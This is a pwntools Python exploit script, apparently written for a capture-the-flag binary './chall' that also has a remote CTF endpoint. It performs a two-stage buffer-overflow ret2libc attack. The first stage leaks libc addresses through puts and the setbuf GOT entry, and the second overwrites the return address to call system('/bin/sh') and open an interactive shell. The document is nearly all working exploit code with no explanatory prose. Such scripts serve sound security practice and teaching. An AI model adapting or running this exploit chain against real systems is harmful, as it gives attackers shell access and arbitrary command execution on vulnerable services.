#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './chall'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote('chall.nitdgplug.org', 30081)

    p = process([exe] + argv, *a, **kw)
    if args.GDB:
        gdb.attach(p)

    return p

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

offset = 52
binary = ELF(exe)
generator = cyclic_gen()

puts = 0x0804927d
entry = 0x080490c0
system = 0x045040
bin_sh = 0x18c338

################################################################################
# leak libc
################################################################################
log.info('Stage 1. leak libc')

payload = generator.get(offset)
payload += p32(puts)
payload += p32(binary.got.setbuf)
payload += p32(entry)

io.sendlineafter(' ?\n', payload)
leak = io.recvline()
puts_leak = u32(leak[-9:-5])
gets_leak = u32(leak[-13:-9])
libc_base = puts_leak - 0x070460
log.success('Got libc leak. @puts: 0x{:2x}'.format(puts_leak))
log.success('Got libc leak. @gets: 0x{:2x}'.format(gets_leak))
log.success('Got libc base: 0x{:2x}'.format(libc_base))

################################################################################
# system('/bin/sh')
################################################################################
log.info('Stage 2. system("/bin/sh")')
log.info('System at: 0x{:2x}'.format(system + libc_base))
log.info('/bin/sh at: 0x{:2x}'.format(bin_sh + libc_base))

payload = generator.get(offset)
payload += p32(libc_base + system)
payload += p32(0x0)
payload += p32(libc_base + bin_sh)

io.sendline(payload)

io.interactive()

